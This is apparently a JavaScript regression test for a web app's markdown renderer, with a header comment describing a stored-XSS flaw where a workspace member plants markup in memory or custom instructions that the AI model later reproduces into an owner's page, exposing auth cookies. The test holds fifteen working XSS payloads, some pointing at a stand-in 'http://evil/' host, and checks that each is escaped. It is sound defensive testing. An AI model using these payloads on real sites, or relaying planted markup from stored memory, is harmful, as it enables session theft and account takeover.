/**
 * The markdown renderer, attacked with real payloads.
 *
 * WHY.
 *
 * `mdToHtml` feeds `dangerouslySetInnerHTML` in 24 components — every AI answer,
 * every deep dive, every report, the chat transcript. It did no escaping at all.
 * The text it renders is model output plus, through Cortex Memory and custom
 * instructions, text another member of the workspace typed. So a lower-privileged
 * member could plant markup that the model later reproduces into an owner's
 * screen.
 *
 * Severity is account takeover rather than defacement, because @supabase/ssr
 * sets the auth cookies with httpOnly:false — the access and refresh tokens sit
 * in `document.cookie`, readable by any script that executes.
 *
 * This runs the real function (parsed out of the shipping file, not a copy)
 * against payloads that work in `innerHTML`. Note `<script>` is NOT among the
 * asserted-dangerous ones: innerHTML does not execute script tags, and a test
 * that only tried `<script>alert(1)</script>` would have passed against the
 * VULNERABLE version and told us nothing. The payloads below are the ones that
 * actually fire: event handlers on elements that load something.
 */

import { readFileSync } from "node:fs";

let pass = 0;
const failures = [];
const ok = (n) => { pass++; };
const bad = (n, d) => failures.push(`${n}\n      ${d}`);
const check = (c, n, d = "") => (c ? ok(n) : bad(n, d));

/* Load the real implementation by transpiling the module's exports away. */
const src = readFileSync("src/lib/utils.ts", "utf8");
const escapeFn = src.match(/function escapeHtml\(s: string\): string \{[\s\S]*?\n\}/)?.[0];
const mdFn = src.match(/export function mdToHtml\(s: string\): string \{[\s\S]*?\n\}/)?.[0];

check(!!escapeFn, "parse: found escapeHtml in the shipping file",
  "could not locate it — the escaping may have been removed");
check(!!mdFn, "parse: found mdToHtml in the shipping file");

if (!escapeFn || !mdFn) {
  console.log(`\nxss: ${pass} passed, ${failures.length} failed`);
  failures.forEach((f) => console.log("  ✗ " + f));
  process.exit(1);
}

const js = (escapeFn + "\n" + mdFn.replace(/^export /, ""))
  .replace(/: string/g, "")
  .replace(/\): string/g, ")");
const mdToHtml = new Function(`${js}; return mdToHtml;`)();

/* Sanity: the parse produced something that actually works. Without this, a
   broken transpile would make every payload "safe" for the wrong reason. */
check(mdToHtml("**bold**") === "<b>bold</b>",
  "sanity: the loaded function still renders markdown",
  `got: ${mdToHtml("**bold**")}`);
check(mdToHtml("# Title").includes("<h1"), "sanity: headings still render");
check(mdToHtml("- one").includes("<li"), "sanity: list items still render");

/* -------------------------------------------------------------- payloads */

const PAYLOADS = [
  ["img onerror",        `<img src=x onerror="alert(document.cookie)">`],
  ["svg onload",         `<svg/onload=alert(1)>`],
  ["iframe srcdoc",      `<iframe srcdoc="<script>alert(1)</script>">`],
  ["body onload",        `<body onload=alert(1)>`],
  ["details ontoggle",   `<details open ontoggle=alert(1)>`],
  ["video onerror",      `<video><source onerror="alert(1)">`],
  ["a javascript href",  `<a href="javascript:alert(1)">click</a>`],
  ["input onfocus",      `<input autofocus onfocus=alert(1)>`],
  ["style expression",   `<style>@import'http://evil/x.css';</style>`],
  ["base hijack",        `<base href="http://evil/">`],
  ["form action",        `<form action="http://evil/"><button>go`],
  ["attr breakout",      `" onmouseover="alert(1)`],
  ["marquee onstart",    `<marquee onstart=alert(1)>`],
  ["object data",        `<object data="javascript:alert(1)">`],
  ["embed src",          `<embed src="javascript:alert(1)">`],
];

for (const [name, payload] of PAYLOADS) {
  const out = mdToHtml(payload);
  // No raw tag may survive. The only "<" in the output must belong to a tag
  // mdToHtml itself generated (h1-h3, li, b, i, br).
  const tags = out.match(/<\/?([a-zA-Z][a-zA-Z0-9]*)/g) || [];
  const allowed = new Set(["h1", "h2", "h3", "li", "b", "i", "br"]);
  const injected = tags
    .map((t) => t.replace(/^<\/?/, "").toLowerCase())
    .filter((t) => !allowed.has(t));
  check(injected.length === 0, `xss: ${name} is neutralised`,
    `payload produced live tag(s): ${[...new Set(injected)].join(", ")} -> ${out.slice(0, 120)}`);

  /*
    Second property: every `<` from the payload was escaped.

    The obvious assertion here — "the output contains no ` on...=`" — is WRONG,
    and it failed six payloads on the fixed code before I corrected it. Given
    `<body onload=alert(1)>`, the safe output is `&lt;body onload=alert(1)&gt;`:
    the string "onload=" is present, but it is text. There is no element for a
    handler to attach to, because the check above already proved no live tag
    survived. Asserting on the substring flags correct output as a
    vulnerability, and a test that does that gets ignored.

    What actually matters is that no `<` reaches the DOM as markup.
  */
  const rawAngles = (payload.match(/</g) || []).length;
  const escapedAngles = (out.match(/&lt;/g) || []).length;
  check(escapedAngles >= rawAngles, `xss: ${name} — every < was escaped`,
    `${rawAngles} in payload, only ${escapedAngles} escaped -> ${out.slice(0, 120)}`);
}

/* Escaping must not be defeated by double-encoding or entity tricks. */
check(!/<img/i.test(mdToHtml("&lt;img src=x onerror=alert(1)&gt;")),
  "xss: pre-encoded entities are not decoded back into tags");
check(mdToHtml("a & b").includes("&amp;"), "xss: bare ampersand is escaped");
check(!mdToHtml(`"quoted"`).includes(`"`), "xss: double quotes are escaped");

/* Legitimate business text must survive readably — an over-escaper that mangles
   every rupee figure would be reverted within a day. */
const real = mdToHtml("## Cash\n**Revenue** is ₹12.5L & margin _improved_ 3% > last month");
check(real.includes("₹12.5L"), "usability: currency survives", real);
check(real.includes("<b>Revenue</b>"), "usability: bold still works", real);
check(real.includes("<i>improved</i>"), "usability: italic still works", real);
check(real.includes("&gt;") && !real.includes("<b>&gt;"), "usability: a literal > renders as text");

console.log(`\nxss: ${pass} passed, ${failures.length} failed`);
if (failures.length) {
  console.log("\nFAILURES:");
  failures.forEach((f) => console.log("  ✗ " + f));
  process.exit(1);
}
console.log(`  ${PAYLOADS.length} payloads neutralised; markdown and ₹ figures still render.`);
